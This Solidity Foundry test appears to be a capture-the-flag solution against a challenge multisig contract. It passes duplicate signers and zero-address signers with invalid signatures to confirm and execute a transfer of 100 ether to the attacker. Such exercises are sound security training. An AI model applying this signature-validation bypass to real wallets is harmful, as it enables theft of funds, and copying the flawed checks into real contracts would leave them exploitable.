// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Test, console2} from "forge-std/Test.sol";

import {MultisigBaseTest} from "./MultisigBase.t.sol";

contract MultisigTest is MultisigBaseTest {
    function testExploit() external validation {
        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", address(this), 100 ether);
        uint256 transactionId = multisig.submitTransaction{value: 100 ether}(payable(address(token)), data);
        address[] memory signers = new address[](6);
        signers[0] = user0;
        signers[1] = address(0);
        signers[2] = user0;
        signers[3] = address(0);
        signers[4] = user0;
        signers[5] = address(0);

        bytes[] memory signatures = new bytes[](6);
        // bytes32 message = multisig.genMessage(transactionId);
        // bytes32 r;
        // bytes32 s;
        // uint8 v;
        // (v, r, s) = vm.sign(uint256(1337), message);
        // bytes memory sig = abi.encodePacked(bytes32(r), bytes32(s), uint8(v));
        // console2.logBytes(sig);
        for (uint256 i = 0; i < signers.length; i++) {
            // TODO
            if (signers[i] != address(0)) {
                // signatures[i] = sig;
                signatures[i] = hex"460bc5cfd21d924c344e23e57f1f8e85dc205460f6d663a0da456c2e81b2cfca606c8c1699be426fabb34a105fb3e63c68d78ed00c9b268168e71bfe18d744ef1c";
            } else {
                signatures[i] = hex"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
            }
        }
        multisig.confirmTransaction(transactionId, signatures, signers);
        multisig.executeTransaction(transactionId);
    }
}
